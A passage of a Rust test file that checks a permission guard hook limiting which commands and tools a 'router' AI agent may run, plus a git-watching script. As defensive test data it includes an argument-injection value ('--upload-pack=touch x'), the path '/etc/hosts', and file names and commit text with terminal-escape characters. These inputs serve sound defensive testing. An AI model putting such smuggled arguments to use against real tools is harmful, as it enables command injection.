    assert_eq!(guard_event(serde_json::from_str(CAPTURED_BG_WORKER_BASH).unwrap()), None);
}

/// E-ROUTER3.W10: the settings allow exactly the launcher shapes the guard admits; `wait` and `send`
/// are gone from both. E-ROUTER3.W8: `resume` is gone too, and `worktree add|remove` are in.
#[test]
fn settings_allow_exactly_the_launcher_shapes_the_guard_admits() {
    let modes: Vec<String> = settings()["permissions"]["allow"]
        .as_array()
        .unwrap()
        .iter()
        .filter_map(|a| a.as_str().unwrap().strip_prefix("Bash(scripts/router-worker.sh ").map(|m| m.trim_end_matches(" *)").to_string()))
        .collect();
    assert_eq!(modes, ["spawn", "stop", "watchdog start", "watchdog stop", "worktree add", "worktree remove"]);
    for (m, arg) in [("watchdog start", "r1"), ("watchdog stop", "r1"), ("worktree add", "epic/E-X"), ("worktree remove", "wu/E-X/w1-a")] {
        assert_eq!(bash(&format!("scripts/router-worker.sh {m} {arg}")), None, "the guard refuses the allowed {m}");
    }
}

/// One router tool call through the PreToolUse command `checkout`'s .claude/settings.json wires, run
/// as Claude Code runs it; Some(reason) = denied, None = allowed.
fn wired_guard(checkout: &Path, tool: &str, input: serde_json::Value) -> Option<String> {
    let s: serde_json::Value = serde_json::from_str(&std::fs::read_to_string(checkout.join(".claude/settings.json")).unwrap()).unwrap();
    let cmd = s["hooks"]["PreToolUse"][0]["hooks"][0]["command"].as_str().unwrap();
    let event = serde_json::json!({"agent_type": "router", "tool_name": tool, "tool_input": input, "cwd": checkout});
    let mut p = common::cmd("/bin/sh")
        .args(["-c", cmd])
        .env("CLAUDE_PROJECT_DIR", checkout)
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .unwrap();
    std::io::Write::write_all(&mut p.stdin.take().unwrap(), event.to_string().as_bytes()).unwrap();
    decision(&event, p.wait_with_output().unwrap())
}

/// E-ROUTERFIX e2e (W5): one worker's life as the router drives it, in a scratch clone of Keel's own
/// tree with the working tree's epic files laid over it and keel's hooks installed. A new worktree
/// inherits the signer list (W3); every router call passes the settings-wired guard and each allowed
/// command runs exactly as judged; the worker starts in plan mode with the fixed grant (W1) under the
/// name the subscription addresses (W2). E-ROUTER3.W10: the worker is a background session; a
/// follow-up task is the router's message, `wait` and `send` are refused, and `stop` closes it.
#[test]
fn epic_e2e_router_drives_a_granted_worker_in_a_seeded_worktree_to_its_end() {
    let d = TempDir::new().unwrap();
    let base = d.path().canonicalize().unwrap();
    let c = base.join("c");
    common::self_clone(root(), &c);
    for f in ["scripts/router-worker.sh", "scripts/router-guard.jq", ".claude/settings.json", ".gitworktreecopy"] {
        std::fs::copy(root().join(f), c.join(f)).unwrap();
    }
    let keel = Path::new(env!("CARGO_BIN_EXE_keel"));
    assert!(common::cmd(keel).args(["hooks", "install"]).current_dir(&c).output().unwrap().status.success());
    std::fs::write(c.join(".mr-allowed"), "username: owner\n").unwrap();

    // W3: the worktree the worker will run in is created through keel's post-checkout hook
    let wt = base.join("wt");
    let path = format!("{}:{}", keel.parent().unwrap().display(), std::env::var("PATH").unwrap());
    let o = hermetic(&mut common::cmd("git")).args(["worktree", "add", "-q", "-b", "wu/x/e2e", wt.to_str().unwrap()]).current_dir(&c).env("PATH", &path).output().unwrap();
    assert!(o.status.success(), "{}", String::from_utf8_lossy(&o.stderr));
    assert_eq!(std::fs::read_to_string(wt.join(".mr-allowed")).ok().as_deref(), Some("username: owner\n"), "worktree not seeded");

    let stub = base.join("claude");
    stub_claude(&stub);
    let state = base.join("state");
    std::fs::create_dir_all(&state).unwrap();
    let router = |cmd: &str| -> String {
        assert_eq!(wired_guard(&c, "Bash", serde_json::json!({ "command": cmd })), None, "guard denied {cmd:?}");
        let mut p = common::cmd("/bin/sh");
        p.args(["-c", cmd]).current_dir(&c).env("ROUTER_CLAUDE", &stub).env("STUB_STATE", &state);
        bounded(p)
    };

    let name = "e2e-w";
    let brief = c.join(format!(".router/briefs/{name}.md"));
    assert_eq!(wired_guard(&c, "Write", serde_json::json!({ "file_path": brief })), None);
    std::fs::create_dir_all(brief.parent().unwrap()).unwrap();
    std::fs::write(&brief, "run the gate\n").unwrap();

    // W1: spawned in plan mode, a background session in the worktree
    let out = router(&format!("scripts/router-worker.sh spawn {name} {} .router/briefs/{name}.md opus --effort high --permission-mode plan", wt.display()));
    assert!(out.starts_with(&format!("RUNNING name={name} ")) && out.contains(" permission-mode=plan effort=high "), "{out}");
    let (id, sid) = (field(&out, "id=").to_string(), field(&out, "session=").to_string());
    let copy = field(&out, "brief=");
    assert!(copy.starts_with(wt.to_str().unwrap()) && std::fs::read_to_string(copy).unwrap() == "run the gate\n", "{out}");

    // W2, E-ROUTER3.W1: the router subscribes to the worker's end and may steer it with a message;
    // E-ROUTER3.W10: a follow-up task is a message too, and `wait` and `send` are gone
    assert_eq!(wired_guard(&c, "SendMessage", serde_json::json!({"to": name, "notify_when_idle": true})), None);
    let steer = serde_json::json!({"to": name, "message": "stop after the plan", "type": "message", "recipient": name, "content": "stop after the plan"});
    assert_eq!(wired_guard(&c, "SendMessage", steer), None);
    assert_eq!(wired_guard(&c, "SendMessage", serde_json::json!({"to": name, "message": "Follow-up task: now write the notes"})), None);
    for cmd in [format!("scripts/router-worker.sh wait {name}"), format!("scripts/router-worker.sh send {name} .router/briefs/{name}.md")] {
        assert!(wired_guard(&c, "Bash", serde_json::json!({ "command": cmd })).is_some(), "router may run {cmd:?}");
    }
    // the grant is the worker's alone
    for cmd in ["cargo test", "keel preflight wu HEAD", "keel mr confirm wu HEAD --as owner"] {
        assert!(wired_guard(&c, "Bash", serde_json::json!({ "command": cmd })).is_some(), "router may run {cmd:?}");
    }

    // the router closes it: stopped then removed by id, and its argv carried the grant, the mode and the subscribed name
    let out = router(&format!("scripts/router-worker.sh stop {name}"));
    assert_eq!(out, format!("STOPPED name={name} id={id} session={sid}\n"));
    let cli: Vec<Vec<String>> = calls(&state).into_iter().map(|(_, a)| a).filter(|a| a[0] == "stop" || a[0] == "rm").collect();
    assert_eq!(cli, [vec!["stop".to_string(), id.clone()], vec!["rm".to_string(), id]]);
    let a = worker_argv(&state, name);
    assert_eq!(option(&a, "--permission-mode"), "plan");
    assert_eq!(option(&a, "--effort"), "high");
    assert_eq!(option(&a, "-n"), name);
    assert!(!c.join(".router/out").exists());
}

/// A checkout holding scripts/router-watch.sh, cloned from a bare `origin.git` file remote (no
/// network), plus the stepped `sleep` shim and a `date` shim that prints $STEP_DIR/now when it exists.
struct Watcher {
    _d: TempDir,
    base: PathBuf,
    main: PathBuf,
}

fn watcher() -> Watcher {
    let d = TempDir::new().unwrap();
    let base = d.path().canonicalize().unwrap();
    let (origin, main) = (base.join("origin.git"), base.join("main"));
    git(&base, &["init", "-q", "--bare", "-b", "main", origin.to_str().unwrap()]);
    git(&base, &["clone", "-q", origin.to_str().unwrap(), main.to_str().unwrap()]);
    std::fs::create_dir_all(main.join("scripts")).unwrap();
    std::fs::copy(root().join("scripts/router-watch.sh"), main.join("scripts/router-watch.sh")).unwrap();
    git(&main, &["add", "."]);
    git(&main, &["commit", "-qm", "base"]);
    git(&main, &["push", "-q", "origin", "main"]);
    sleep_shim(&base);
    std::fs::write(base.join("shim/date"), "#!/bin/sh\n[ -e \"$STEP_DIR/now\" ] && exec cat \"$STEP_DIR/now\"\nexec /bin/date \"$@\"\n").unwrap();
    std::fs::set_permissions(base.join("shim/date"), std::os::unix::fs::PermissionsExt::from_mode(0o755)).unwrap();
    Watcher { _d: d, base, main }
}

impl Watcher {
    fn sha(&self, rev: &str) -> String {
        String::from_utf8(git(&self.main, &["rev-parse", rev]).stdout).unwrap().trim().to_string()
    }

    /// Write each file (content = msg) on the current branch and commit them; returns the new tip.
    fn commit(&self, files: &[&str], msg: &str) -> String {
        for f in files {
            std::fs::write(self.main.join(f), msg).unwrap();
            git(&self.main, &["add", f]);
        }
        git(&self.main, &["commit", "-qm", msg]);
        self.sha("HEAD")
    }

    /// `scripts/router-watch.sh <args>` as the router runs it, its polls stepped through steps-<k>/;
    /// an exported ROUTER_WATCH_POLL or ROUTER_WATCH_MAX never reaches it, only `env` sets them.
    fn cmd(&self, args: &[&str], k: &str, env: &[(&str, &str)]) -> (Command, PathBuf) {
        let dir = self.base.join(format!("steps-{k}"));
        std::fs::create_dir_all(&dir).unwrap();
        let mut c = common::cmd("scripts/router-watch.sh");
        hermetic(&mut c)
            .args(args)
            .current_dir(&self.main)
            .env("PATH", format!("{}:{}", self.base.join("shim").display(), std::env::var("PATH").unwrap()))
            .env("STEP_DIR", &dir)
            .env("STUB_OWNER", std::process::id().to_string())
            .env_remove("ROUTER_WATCH_POLL")
            .env_remove("ROUTER_WATCH_MAX")
            .envs(env.iter().copied());
        (c, dir)
    }

    fn armed(&self, args: &[&str], k: &str) -> Stepped {
        self.armed_env(args, k, &[])
    }

    fn armed_env(&self, args: &[&str], k: &str, env: &[(&str, &str)]) -> Stepped {
        let (mut c, dir) = self.cmd(args, k, env);
        Stepped { child: c.stdout(Stdio::piped()).stderr(Stdio::piped()).spawn().unwrap(), dir }
    }

    /// A `git` on $PATH (with the `sleep` shim) ahead of the real one that logs each call to <base>/spy.log and, when
    /// $GIT_SPY_FAIL is 1, fails every fetch: returns that PATH and the log.
    fn spy(&self) -> (String, PathBuf) {
        let real = String::from_utf8(common::cmd("sh").args(["-c", "command -v git"]).output().unwrap().stdout).unwrap();
        let dir = self.base.join("spy");
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::write(dir.join("git"), format!(
            "#!/bin/sh\necho \"$*\" >> \"$GIT_SPY_LOG\"\ncase \"$GIT_SPY_FAIL $*\" in 1*\" fetch \"*) printf 'fatal: spy refuses fetch\\nspy: last\\377line\\n' >&2; exit 128;; esac\nexec {} \"$@\"\n",
            real.trim()
        )).unwrap();
        std::fs::set_permissions(dir.join("git"), std::os::unix::fs::PermissionsExt::from_mode(0o755)).unwrap();
        (format!("{}:{}:{}", dir.display(), self.base.join("shim").display(), std::env::var("PATH").unwrap()), self.base.join("spy.log"))
    }

    /// One run to its end with polls 1..=go pre-released: (exit code, stdout, stderr, polls taken).
    /// A run still going after BOUND (it polled past `go`) is killed and fails the test.
    fn run(&self, args: &[&str], k: &str, go: u32, env: &[(&str, &str)]) -> (Option<i32>, String, String, u32) {
        let s = self.armed_env(args, k, env);
        for n in 1..=go {
            s.go(n);
        }
        let dir = s.dir.clone();
        let o = s.output();
        let polls = std::fs::read_to_string(dir.join("polls")).map_or(0, |s| s.trim().parse().unwrap());
        (o.status.code(), String::from_utf8(o.stdout).unwrap(), String::from_utf8(o.stderr).unwrap(), polls)
    }
}

/// E-SEED2.W12 review r3: git under a test ignores whatever global or system config the environment
/// points at, so a user's tag.gpgSign (or any other setting) cannot change a test's outcome.
#[test]
fn hermetic_git_ignores_global_and_system_config() {
    let d = TempDir::new().unwrap();
    let hostile = d.path().join("gitconfig");
    std::fs::write(&hostile, "[tag]\n\tgpgSign = true\n").unwrap();
    let mut c = common::cmd("git");
    c.args(["config", "--list", "--show-origin"]).current_dir(d.path()).env("GIT_CONFIG_GLOBAL", &hostile).env("GIT_CONFIG_SYSTEM", &hostile).env("GIT_TRACE", "1");
    let o = hermetic(&mut c).output().unwrap();
    let list = String::from_utf8(o.stdout).unwrap();
    assert!(o.status.success() && !list.contains("gpgsign"), "{list}");
    assert_eq!(String::from_utf8(o.stderr).unwrap(), "", "a GIT_TRACE* variable reached git");
    let mut c = common::cmd("git");
    c.args(["init", "-q", "r"]).current_dir(d.path()).env("GIT_DEFAULT_HASH", "sha256");
    assert!(hermetic(&mut c).status().unwrap().success());
    let f = hermetic(&mut common::cmd("git")).args(["rev-parse", "--show-object-format"]).current_dir(d.path().join("r")).output().unwrap();
    assert_eq!(String::from_utf8(f.stdout).unwrap(), "sha1\n", "GIT_DEFAULT_HASH reached git init");
}

/// E-SEED2.W12: every argument router-watch.sh cannot validate is refused with exit 2 before its
/// first poll; no git option can ride in on a leading `-`.
#[test]
fn watch_refuses_bad_arguments_before_any_poll() {
    let w = watcher();
    let t = w.sha("HEAD");
    let tree = w.sha("HEAD^{tree}");
    for (args, why) in [
        (vec![], "kind"),
        (vec!["watch", "main"], "kind"),
        (vec!["signed"], "signed <tip>"),
        (vec!["signed", &t, "x"], "signed <tip>"),
        (vec!["merged", &t], "merged <tip> <target>"),
        (vec!["merged", &t, "main", "x"], "merged <tip> <target>"),
        (vec!["pushed", &t, "main", "x"], "pushed <tip> <branch>"),
        (vec!["pushed", &t], "pushed <tip> <branch>"),
        (vec!["tagged"], "tagged <tag> [<sha>]"),
        (vec!["tagged", "v1", &t, "x"], "tagged <tag> [<sha>]"),
        (vec!["commit", "main"], "commit <branch> <old-tip>"),
        (vec!["pushed", &t, "--upload-pack=touch x"], "may not start with -"),
        (vec!["commit", "-b", &t], "may not start with -"),
        (vec!["commit", "main", &t, "-x"], "may not start with -"),
        (vec!["commit", "no/such", &t], "no branch"),
        (vec!["commit", "a..b", &t], "no branch"),
        (vec!["merged", &t, "nope"], "no branch"),
        (vec!["pushed", &t, "nope"], "no branch"),
        (vec!["tagged", "v1..2"], "bad tag"),
        (vec!["signed", "deadbeef"], "not a commit"),
        (vec!["signed", "HEAD"], "not a commit"),
        (vec!["signed", "abc"], "not a commit"),
        (vec!["signed", &tree], "not a commit"),
        (vec!["tagged", "v1", "deadbeef"], "not a commit"),
        (vec!["commit", "main", &t, "../x"], "bad path"),
        (vec!["commit", "main", &t, "a/../b"], "bad path"),
        (vec!["commit", "main", &t, "/etc/hosts"], "bad path"),
    ] {
        let (code, out, err, polls) = w.run(&args, "refuse", 0, &[]);
        assert!(
            code == Some(2) && out.is_empty() && err.starts_with("router-watch: ") && err.contains(why),
            "{args:?} not refused for {why}: {code:?} {out} {err}"
        );
        assert_eq!(polls, 0, "{args:?} polled before refusing");
    }
    let huge = "99999999999999999999";
    for (k, v) in [("ROUTER_WATCH_POLL", "x"), ("ROUTER_WATCH_POLL", "0"), ("ROUTER_WATCH_POLL", "1.5"), ("ROUTER_WATCH_POLL", "-1"), ("ROUTER_WATCH_POLL", huge), ("ROUTER_WATCH_MAX", "x"), ("ROUTER_WATCH_MAX", " 5"), ("ROUTER_WATCH_MAX", "1e3"), ("ROUTER_WATCH_MAX", huge)] {
        let (code, out, err, polls) = w.run(&["signed", &t], "knob", 0, &[(k, v)]);
        assert!(code == Some(2) && out.is_empty() && err.contains(k) && polls == 0, "{k}={v:?} not refused: {code:?} {out} {err}");
    }
}

/// E-SEED2.W12: `commit` fires when the branch moves and reports each commit with its Reviewed-By,
/// every landed path, and the staged paths that are missing or unexpected; a rewritten branch is
/// REWRITTEN.
#[test]
fn watch_commit_reports_what_landed_against_what_was_staged() {
    let w = watcher();
    let old = w.sha("HEAD");
    let mut s = w.armed(&["commit", "main", &old, "a", "b"], "partial");
    s.at(1);
    s.go(1);
    s.at(2);
    let a = w.commit(&["a"], "docs: a\n\nReviewed-By: username vuluu");
    s.go(2);
    assert_eq!(
        s.line(),
        format!("COMMITTED-PARTIAL branch=main from={old} to={a} commits=1 expected=1/2\n  commit {a} reviewed-by=username vuluu docs: a\n  landed A a\n  missing b\n")
    );

    // already true when armed: fires on the first check, before any poll
    let c = w.commit(&["c"], "c");
    let d = w.commit(&["d", "a"], "d");
    let (code, out, _, polls) = w.run(&["commit", "main", &old, "a", "c"], "already", 0, &[]);
    assert_eq!((code, polls), (Some(0), 0));
    assert_eq!(
        out,
        format!(
            "COMMITTED branch=main from={old} to={d} commits=3 expected=2/2\n  commit {a} reviewed-by=username vuluu docs: a\n  commit {c} reviewed-by=none c\n  commit {d} reviewed-by=none d\n  landed A a\n  landed A c\n  landed A d\n  unexpected d\n"
        )
    );
    let (_, out, _, _) = w.run(&["commit", "main", &c], "nopaths", 0, &[]);
    assert_eq!(out, format!("COMMITTED branch=main from={c} to={d} commits=1 expected=0/0\n  commit {d} reviewed-by=none d\n  landed M a\n  landed A d\n"));

    let mut s = w.armed(&["commit", "main", &d], "rewritten");
    s.at(1);
    git(&w.main, &["commit", "-q", "--amend", "-m", "d2"]);
    s.go(1);
    let d2 = w.sha("HEAD");
    assert_eq!(s.line(), format!("REWRITTEN branch=main from={d} to={d2}\n"));

    // a folded trailer is one value; control characters in commit text never reach the router raw
    let f = w.commit(&["f"], "f \x1b[2Jx\ry\n\nReviewed-By: username\n vuluu\x07");
    let (_, out, _, _) = w.run(&["commit", "main", &d2], "folded", 0, &[]);
    assert_eq!(out, format!("COMMITTED branch=main from={d2} to={f} commits=1 expected=0/0\n  commit {f} reviewed-by=username vuluu? f ?[2Jx?y\n  landed A f\n"));

    // a net-empty range with staged paths: every path missing, no stray line
    let e = w.commit(&["e"], "e");
    git(&w.main, &["rm", "-q", "e"]);
    git(&w.main, &["commit", "-qm", "drop e"]);
    let de = w.sha("HEAD");
    let (_, out, _, _) = w.run(&["commit", "main", &f, "e"], "empty", 0, &[]);
    assert_eq!(out, format!("COMMITTED-PARTIAL branch=main from={f} to={de} commits=2 expected=0/1\n  commit {e} reviewed-by=none e\n  commit {de} reviewed-by=none drop e\n  missing e\n"));

    // a branch deleted mid-watch is DELETED, not a rewrite
    git(&w.main, &["branch", "wu/gone"]);
    let g = w.sha("wu/gone");
    let mut s = w.armed(&["commit", "wu/gone", &g], "deleted");
    s.at(1);
    git(&w.main, &["branch", "-q", "-D", "wu/gone"]);
    s.go(1);
    assert_eq!(s.line(), format!("DELETED branch=wu/gone from={g}\n"));

    // review r4: a hostile file name never reaches the router raw, even under core.quotePath=false
    git(&w.main, &["config", "core.quotePath", "false"]);
    let h = w.sha("HEAD");
    let hh = w.commit(&["e\u{202e}v\u{2028}l\u{9b}"], "h");
    let (_, out, _, _) = w.run(&["commit", "main", &h, "x\x1b[2J"], "hostile-path", 0, &[]);
    assert_eq!(out, format!("COMMITTED-PARTIAL branch=main from={h} to={hh} commits=1 expected=0/1\n  commit {hh} reviewed-by=none h\n  landed A e?v?l?\n  missing x?[2J\n  unexpected e?v?l?\n"));
}

/// E-SEED2.W12: `signed` fires on the mr note and prints its payload; `merged` fires once the tip is in
/// the target and says how it got there.
#[test]
fn watch_signed_and_merged_report_the_note_and_how_the_tip_landed() {
    let w = watcher();
    let t = w.sha("HEAD");
    git(&w.main, &["notes", "--ref=test", "add", "-m", "test/v1", &t]);
    let mut s = w.armed(&["signed", &t], "signed");
    s.at(1);
    git(&w.main, &["notes", "--ref=mr", "add", "-m", "level: wu\nby: vu\rluu\x1b]0;x\x07\x7f\nu: \u{7e}\u{80}\u{9b}\u{9f}\u{a0}\u{e9}|\u{2027}\u{2028}\u{2029}\u{202e}\u{202f}|\u{2065}\u{2066}\u{2069}\u{206a}", &t]);
    s.go(1);
    assert_eq!(s.line(), format!("SIGNED tip={t}\n  level: wu\n  by: vu?luu?]0;x??\n  u: ~???\u{a0}\u{e9}|\u{2027}???\u{202f}|\u{2065}??\u{206a}\n"));

    // review r8: a note with an invalid UTF-8 byte, under the router's UTF-8 locale: one SIGNED, exit 0
    let u = w.commit(&["u"], "u");
    let note = w.base.join("bad-note");
    std::fs::write(&note, b"by: a\xffb\n").unwrap();
    git(&w.main, &["notes", "--ref=mr", "add", "-F", note.to_str().unwrap(), &u]);
    let o = w.armed_env(&["signed", &u], "bad-byte", &[("LC_ALL", "en_US.UTF-8")]).output();
    assert_eq!((o.status.code(), o.stdout), (Some(0), [format!("SIGNED tip={u}\n").as_bytes(), b"  by: a\xffb\n"].concat()));

    git(&w.main, &["switch", "-q", "-c", "wu/x"]);
    let x = w.commit(&["x"], "x");
    git(&w.main, &["switch", "-q", "main"]);
    let mut s = w.armed(&["merged", &x, "main"], "noff");
    s.at(1);
    git(&w.main, &["merge", "-q", "--no-ff", "-m", "merge x", "wu/x"]);
    s.go(1);
    assert_eq!(s.line(), format!("MERGED tip={x} target=main at={} how=no-ff\n", w.sha("main")));

    git(&w.main, &["switch", "-q", "-c", "wu/y"]);
    let y = w.commit(&["y"], "y");
    git(&w.main, &["switch", "-q", "main"]);
    git(&w.main, &["merge", "-q", "--ff-only", "wu/y"]);
    let (_, out, _, polls) = w.run(&["merged", &y[..7], "main"], "ff", 0, &[]);
    assert_eq!((out, polls), (format!("MERGED tip={y} target=main at={y} how=ff\n"), 0));

    git(&w.main, &["switch", "-q", "-c", "wu/z"]);
    let z = w.commit(&["z"], "z");
    git(&w.main, &["switch", "-q", "-c", "wu/z2"]);
    w.commit(&["z2"], "z2");
    git(&w.main, &["switch", "-q", "main"]);
    git(&w.main, &["merge", "-q", "--no-ff", "-m", "merge z2", "wu/z2"]);
    let (_, out, _, _) = w.run(&["merged", &z, "main"], "contained", 0, &[]);
    assert_eq!(out, format!("MERGED tip={z} target=main at={} how=contained\n", w.sha("main")));

    // review r3 (owner ruling V1-A): a target deleted mid-watch ends the watch at once, quietly
    git(&w.main, &["branch", "epic/gone"]);
    git(&w.main, &["switch", "-q", "-c", "wu/v"]);
    let v = w.commit(&["v"], "v");
    git(&w.main, &["switch", "-q", "main"]);
    let mut s = w.armed(&["merged", &v, "epic/gone"], "target-deleted");
    s.at(1);
    git(&w.main, &["branch", "-q", "-D", "epic/gone"]);
    s.go(1);
    let dir = s.dir.clone();
    let o = s.output();
    assert_eq!((o.status.code(), String::from_utf8(o.stdout).unwrap(), String::from_utf8(o.stderr).unwrap()), (Some(0), "DELETED target=epic/gone\n".into(), String::new()));
    assert_eq!(std::fs::read_to_string(dir.join("polls")).unwrap().trim(), "1");
}

/// E-SEED2.W12 review r1: a branch that exists only locally is "not pushed yet", never a network
/// failure; the watch keeps polling past 5 attempts and fires PUSHED after the first push.
#[test]
fn watch_pushed_waits_on_a_local_only_branch_without_reporting_unreachable() {
    let w = watcher();
    git(&w.main, &["switch", "-q", "-c", "wu/local"]);
    let t = w.commit(&["l"], "l");
    let mut s = w.armed(&["pushed", &t, "wu/local"], "local-only");
    s.at(1);
    for n in 1..=5 {
        s.go(n);
        s.at(n + 1);
    }
    git(&w.main, &["push", "-q", "origin", "wu/local"]);
    s.go(6);
    let dir = s.dir.clone();
    assert_eq!(s.line(), format!("PUSHED tip={t} branch=wu/local origin={t}\n"));
    assert_eq!(std::fs::read_to_string(dir.join("sleeps")).unwrap(), "60\n".repeat(6), "pushed polls every 60 s by default");
}

/// The test harness itself: a watch that polls more than the test released fails the test in
/// bounded time instead of hanging `cargo test`, and leaves no `sleep` shim behind.
#[test]
fn watcher_run_is_bounded_when_the_watch_outpolls_its_releases() {
    let w = watcher();
    let t = w.sha("HEAD");
    let msg = |e: Box<dyn std::any::Any + Send>| e.downcast_ref::<String>().cloned().or_else(|| e.downcast_ref::<&str>().map(|m| m.to_string())).unwrap();
    let e = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| w.run(&["signed", &t], "unreleased", 0, &[]))).unwrap_err();
    assert!(msg(e).contains("never returned"));
    let mut at = w.armed(&["signed", &t], "unreleased-at");
    let out = w.armed(&["signed", &t], "unreleased-output");
    std::thread::scope(|sc| {
        let a = sc.spawn(|| std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| at.at(2))).unwrap_err());
        let o = sc.spawn(|| std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| out.output())).unwrap_err());
        assert!(msg(a.join().unwrap()).contains("never reached poll 2"));
        assert!(msg(o.join().unwrap()).contains("never returned"));
    });
    drop(at);
    let shim = w.base.join("shim/sleep");
    let shim = shim.to_str().unwrap();
    until("the sleep shim to exit", || {
        let o = Command::new("ps").args(["-A", "-o", "command="]).output().unwrap();
        !String::from_utf8_lossy(&o.stdout).contains(shim)
    });
}

/// E-SEED2.W12: `pushed` fires only once origin holds the tip (not on the local merge); `tagged` fires
/// once origin lists the tag and flags a tag on another commit.
#[test]
fn watch_pushed_and_tagged_fire_on_origin_only() {
    let w = watcher();
    let base = w.sha("HEAD");
    git(&w.main, &["switch", "-q", "-c", "wu/p"]);
    let t = w.commit(&["p"], "p");
    git(&w.main, &["switch", "-q", "main"]);
    let mut s = w.armed(&["pushed", &t, "main"], "pushed");
    s.at(1);
    git(&w.main, &["merge", "-q", "--no-ff", "-m", "merge p", "wu/p"]);
    s.go(1);
    s.at(2);
    git(&w.main, &["push", "-q", "origin", "main"]);
    s.go(2);
    assert_eq!(s.line(), format!("PUSHED tip={t} branch=main origin={}\n", w.sha("main")));

    // the fetch writes refs/remotes/origin/<b> and nothing else: no auto-followed tag, no FETCH_HEAD
    let other = w.base.join("other");
    git(&w.base, &["clone", "-q", w.base.join("origin.git").to_str().unwrap(), other.to_str().unwrap()]);
    git(&other, &["commit", "-q", "--allow-empty", "-m", "o"]);
    git(&other, &["tag", "-a", "vo", "-m", "vo"]);
    git(&other, &["push", "-q", "origin", "main", "vo"]);
    let o = String::from_utf8(git(&other, &["rev-parse", "HEAD"]).stdout).unwrap().trim().to_string();
    let m = w.sha("main");
    let refs = || String::from_utf8(git(&w.main, &["for-each-ref", "--format=%(refname) %(objectname)"]).stdout).unwrap();
    git(&w.main, &["update-ref", "-d", "refs/remotes/origin/HEAD"]);
    git(&w.main, &["config", "remote.origin.followRemoteHEAD", "always"]);
    let before = refs();
    let (_, out, _, _) = w.run(&["pushed", &m, "main"], "only-ref", 0, &[]);
    assert_eq!(out, format!("PUSHED tip={m} branch=main origin={o}\n"));
    let after = refs();
    let changed: Vec<&str> = after.lines().filter(|l| !before.lines().any(|b| b == *l)).collect();
    assert_eq!(changed, [format!("refs/remotes/origin/main {o}")], "pushed wrote more than its ref:\n{after}");
    let gitdir = w.main.join(".git");
    assert!(!gitdir.join("FETCH_HEAD").exists(), "pushed wrote FETCH_HEAD");

    // origin/<b> already at origin's tip: no fetch
    let (path, log) = w.spy();
    let (_, out, _, _) = w.run(&["pushed", &m, "main"], "no-fetch", 0, &[("PATH", &path), ("GIT_SPY_LOG", log.to_str().unwrap())]);
    assert_eq!(out, format!("PUSHED tip={m} branch=main origin={o}\n"));
    let calls = std::fs::read_to_string(&log).unwrap();
    assert!(calls.contains("ls-remote") && !calls.contains("fetch"), "{calls}");

    let mut s = w.armed(&["tagged", "v1", &t], "tagged");
    s.at(1);
    git(&w.main, &["tag", "-a", "v1", "-m", "v1", &t]);
    s.go(1);
    s.at(2);
    git(&w.main, &["push", "-q", "origin", "v1"]);
    s.go(2);
    let dir = s.dir.clone();
    assert_eq!(s.line(), format!("TAGGED tag=v1 object={} commit={t}\n", w.sha("v1")));
    assert_eq!(std::fs::read_to_string(dir.join("sleeps")).unwrap(), "60\n60\n", "tagged polls every 60 s by default");

    git(&w.main, &["tag", "v2", &base]);
    git(&w.main, &["push", "-q", "origin", "v2"]);
    let (_, out, _, _) = w.run(&["tagged", "v2", &t], "mismatch", 0, &[]);
    assert_eq!(out, format!("TAGGED-MISMATCH tag=v2 object={base} commit={base} expected={t}\n"));
    let (_, out, _, _) = w.run(&["tagged", "v2"], "no-sha", 0, &[]);
    assert_eq!(out, format!("TAGGED tag=v2 object={base} commit={base}\n"), "with no sha any commit is TAGGED");
}

/// E-SEED2.W12: past its deadline the watch prints TIMEOUT; a network kind gives up after 5 failed
/// attempts in a row with UNREACHABLE and the last error in plain words.
#[test]
fn watch_times_out_and_reports_an_unreachable_origin() {
    let w = watcher();
    let t = w.sha("HEAD");
    let (code, out, _, polls) = w.run(&["signed", &t], "timeout", 0, &[("ROUTER_WATCH_MAX", "0")]);
    assert_eq!((code, out.as_str(), polls), (Some(0), "TIMEOUT kind=signed waited=0m\n", 0));

    git(&w.main, &["remote", "set-url", "origin", w.base.join("missing.git").to_str().unwrap()]);
    for (args, k) in [(vec!["pushed", t.as_str(), "main"], "pushed"), (vec!["tagged", "v1"], "tagged")] {
        let (code, out, _, polls) = w.run(&args, &format!("unreachable-{k}"), 4, &[]);
        let err = out.strip_prefix(&format!("UNREACHABLE kind={k} remote=origin error=")).unwrap_or_else(|| panic!("{out}"));
        assert!(code == Some(0) && out.lines().count() == 1 && err.trim().len() > 1, "{out}");
        assert!(err.trim_end().chars().all(|c| c.is_ascii_alphanumeric() || " ._/:=@%,+^~-".contains(c)), "{out}");
        assert_eq!(polls, 4, "{k}: 5 attempts, 4 polls between them");
    }

    // a success resets the count: 4 failures, 1 success, then 5 more failures before UNREACHABLE
    git(&w.main, &["commit", "-q", "--allow-empty", "-m", "local only"]);
    let local = w.sha("HEAD");
    let mut s = w.armed(&["pushed", &local, "main"], "reset");
    for n in 1..=3 {
        s.go(n);
    }
    s.at(4);
    git(&w.main, &["remote", "set-url", "origin", w.base.join("origin.git").to_str().unwrap()]);
    s.go(4);
    s.at(5);
    git(&w.main, &["remote", "set-url", "origin", w.base.join("missing.git").to_str().unwrap()]);
    for n in 5..=9 {
        s.go(n);
    }
    let dir = s.dir.clone();
    let out = s.line();
    assert!(out.starts_with("UNREACHABLE kind=pushed "), "{out}");
    assert_eq!(std::fs::read_to_string(dir.join("polls")).unwrap().trim(), "9", "the count did not reset on success");

    // review r3: a poll whose ls-remote works but whose fetch fails is a failed attempt; a poll that
    // finds the branch missing on origin is a good one and resets the count
    git(&w.main, &["remote", "set-url", "origin", w.base.join("origin.git").to_str().unwrap()]);
    git(&w.main, &["push", "-q", "origin", "main"]);
    let tip = w.sha("main");
    let other = w.base.join("other-f");
    git(&w.base, &["clone", "-q", w.base.join("origin.git").to_str().unwrap(), other.to_str().unwrap()]);
    git(&other, &["commit", "-q", "--allow-empty", "-m", "ahead"]);
    git(&other, &["push", "-q", "origin", "HEAD:refs/heads/wu/f"]);
    git(&w.main, &["fetch", "-q", "origin", "wu/f"]);
    git(&other, &["commit", "-q", "--allow-empty", "-m", "ahead2"]);
    git(&other, &["push", "-q", "origin", "HEAD:refs/heads/wu/f"]);
    let (path, log) = w.spy();
